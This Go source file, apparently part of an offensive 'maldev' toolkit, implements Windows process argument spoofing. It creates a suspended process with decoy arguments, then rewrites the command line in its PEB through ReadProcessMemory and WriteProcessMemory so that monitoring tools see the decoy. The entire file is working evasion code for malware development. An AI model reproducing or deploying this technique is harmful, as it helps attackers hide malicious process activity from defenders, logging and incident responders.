//go:build windows

package inject

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// unicodeString mirrors the UNICODE_STRING structure in the Windows PEB.
type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	_             [4]byte // padding on x64
	Buffer        uintptr
}

// Offset of ProcessParameters pointer within RTL_USER_PROCESS_PARAMETERS.
// On x64: PEB.ProcessParameters is at PEB+0x20.
const pebProcessParametersOffset = 0x20

// Offset of CommandLine (UNICODE_STRING) within RTL_USER_PROCESS_PARAMETERS.
// On x64: 0x70.
const processParamsCmdLineOffset = 0x70

// SpawnWithSpoofedArgs creates a suspended process with fakeArgs visible
// in Task Manager, then overwrites the PEB command line with realArgs
// before resuming. External observers see fakeArgs.
//
// The caller is responsible for closing the returned ProcessInformation
// handles (Process and Thread) and for resuming the main thread when ready.
func SpawnWithSpoofedArgs(exePath, fakeArgs, realArgs string) (*windows.ProcessInformation, error) {
	if exePath == "" {
		return nil, fmt.Errorf("executable path required")
	}

	// Build the fake command line: "exePath" fakeArgs
	fakeCmdLine := exePath
	if fakeArgs != "" {
		fakeCmdLine = exePath + " " + fakeArgs
	}

	cmdLinePtr, err := windows.UTF16PtrFromString(fakeCmdLine)
	if err != nil {
		return nil, fmt.Errorf("command line conversion failed: %w", err)
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	// 1. Create process suspended with fake args.
	if err := windows.CreateProcess(
		nil, cmdLinePtr, nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	); err != nil {
		return nil, fmt.Errorf("process creation failed: %w", err)
	}

	// If PEB overwrite fails, terminate the suspended process.
	success := false
	defer func() {
		if !success {
			windows.TerminateProcess(pi.Process, 1)
			windows.CloseHandle(pi.Process)
			windows.CloseHandle(pi.Thread)
		}
	}()

	// 2. Get PEB address.
	var pbi processBasicInfo
	var retLen uint32
	status, _, _ := api.ProcNtQueryInformationProcess.Call(
		uintptr(pi.Process),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if status != 0 {
		return nil, fmt.Errorf("process information query failed: NTSTATUS 0x%X", status)
	}

	// 3. Read ProcessParameters pointer from PEB.
	var processParams uintptr
	if err := windows.ReadProcessMemory(
		pi.Process,
		pbi.PebBaseAddress+pebProcessParametersOffset,
		(*byte)(unsafe.Pointer(&processParams)),
		unsafe.Sizeof(processParams),
		nil,
	); err != nil {
		return nil, fmt.Errorf("failed to read process parameters pointer: %w", err)
	}

	// 4. Read CommandLine UNICODE_STRING from ProcessParameters.
	cmdLineStructAddr := processParams + processParamsCmdLineOffset
	var cmdLineUS unicodeString
	if err := windows.ReadProcessMemory(
		pi.Process,
		cmdLineStructAddr,
		(*byte)(unsafe.Pointer(&cmdLineUS)),
		unsafe.Sizeof(cmdLineUS),
		nil,
	); err != nil {
		return nil, fmt.Errorf("failed to read command line structure: %w", err)
	}

	// 5. Encode realArgs as UTF-16LE.
	realCmdLine := exePath
	if realArgs != "" {
		realCmdLine = exePath + " " + realArgs
	}
	realUTF16 := utf16LEBytes(realCmdLine)

	// Verify the real args fit in the existing buffer.
	if uint16(len(realUTF16)) > cmdLineUS.MaximumLength {
		return nil, fmt.Errorf("real arguments exceed allocated buffer capacity")
	}

	// 6. Write realArgs to the remote CommandLine.Buffer.
	if err := windows.WriteProcessMemory(
		pi.Process,
		cmdLineUS.Buffer,
		&realUTF16[0],
		uintptr(len(realUTF16)),
		nil,
	); err != nil {
		return nil, fmt.Errorf("failed to write real arguments: %w", err)
	}

	// 7. Update CommandLine.Length in remote memory.
	newLength := uint16(len(realUTF16))
	var lengthBytes [2]byte
	binary.LittleEndian.PutUint16(lengthBytes[:], newLength)
	if err := windows.WriteProcessMemory(
		pi.Process,
		cmdLineStructAddr,
		&lengthBytes[0],
		2,
		nil,
	); err != nil {
		return nil, fmt.Errorf("failed to update command line length: %w", err)
	}

	success = true
	return &pi, nil
}

// utf16LEBytes converts a Go string to a null-terminated UTF-16LE byte slice.
func utf16LEBytes(s string) []byte {
	u16, _ := windows.UTF16FromString(s)
	buf := make([]byte, len(u16)*2)
	for i, v := range u16 {
		binary.LittleEndian.PutUint16(buf[i*2:], v)
	}
	return buf
}
